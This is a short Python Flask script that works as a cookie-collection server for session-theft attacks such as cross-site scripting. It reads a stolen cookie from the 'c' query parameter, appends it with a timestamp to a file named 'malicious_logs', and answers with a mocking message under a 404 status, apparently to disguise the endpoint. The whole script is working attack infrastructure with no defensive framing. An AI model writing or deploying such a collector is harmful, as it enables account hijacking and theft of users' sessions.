import sys
import os
from flask import Flask, request, redirect
from datetime import datetime


app = Flask(__name__)

@app.route('/')
def get_cookies():
    cookie = request.args.get('c')

    f = open("/malicious_logs/logs.txt", 'a')
    f.write(str(cookie) + ' ' + str(datetime.now()) +'\n')
    f.close()
    response_object = {
            'status' : 'thankssss', 
            'message' : 'wow, what a cookie bite'
        }
    return response_object, 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port = os.getenv("RUNNING_PORT"))